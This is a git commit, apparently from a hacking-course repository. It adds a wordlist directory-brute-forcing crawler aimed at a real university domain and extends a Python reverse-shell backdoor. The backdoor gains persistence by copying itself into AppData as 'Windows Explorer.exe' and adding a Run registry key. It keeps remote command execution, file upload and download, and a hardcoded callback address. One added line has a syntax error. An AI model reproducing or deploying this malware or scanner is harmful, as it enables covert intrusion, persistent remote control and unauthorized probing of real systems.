e24479adb5cdd2f6f2608bd30a137bb439db1bf8
frozenegg <silicondoo@gmail.com>
2020-03-23 02:57:49 +0900

    asdfasdf

---
+++ zaid2/crawler.py
@@ -0,0 +1,29 @@
+#!/usr/bin/python
+
+import requests
+
+def request(url):
+    try:
+        get_response = requests.get("http://" + url)
+        return(get_response)
+    except requests.exceptions.ConnectionError:
+        pass
+
+target_url = "kyoto-u.ac.jp"
+
+# with open("subdomains_wordlist.txt", "r") as wordlist_file:
+#     for line in wordlist_file:
+#         word = line.strip()
+#         test_url = word + "." + target_url
+#         # print(test_url)
+#         response = request(test_url)
+#         if response:
+#             print("[+] Discovered subdomain --> " + test_url)
+
+with open("directory_wordlist.txt", "r") as wordlist_file:
+    for line in wordlist_file:
+        word = line.strip()
+        test_url = target_url + "/" + word
+        response = request(test_url)
+        if response:
+            print("[+] Discovered directory --> " + test_url)
--- zaid2/reverse_backdoor_class.py
+++ zaid2/reverse_backdoor_class.py
@@ -1,9 +1,10 @@
 #!/usr/bin/python
 
-import socket, subprocess, json, os, base64
+import socket, subprocess, json, os, base64, sys, shutil
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
@@ -23,7 +24,8 @@ class Backdoor:
                 continue
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        DEVNULL = open(os.devnull, 'wb')  # needed for python2
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL) # when using python3, put subprocess.DEVNULL instead of DEVNULL and remove DEVNULL = ... part
         # try: # above
         # except subprocess.CalledProcessError:
         #     return "error during command execution"
@@ -41,6 +43,13 @@ class Backdoor:
             file.write(base64.b64decode(content))
             return "[+] Upload successful"
 
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location) # substitute sys.exectuable with "__file__" if you want .py file as it is
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+
+
     def run(self):
         while True:
             # command = self.connection.recv(1024) # buffer size
@@ -48,7 +57,7 @@ class Backdoor:
                 command = self.reliable_recieve()
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     self.change_working_directory_to(command[1])
                 elif command[0] == "download":
@@ -61,8 +70,10 @@ class Backdoor:
                 command_result = "[-] Error during command execution"
             # self.connection.send(command_result)
             self.reliable_send(command_result)
-
-my_backdoor = Backdoor("192.168.2.106", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("192.168.2.104", 4444)
+    my_backdoor.run()
+except: Exception:
+    sys.exit()
 
 # Serialization
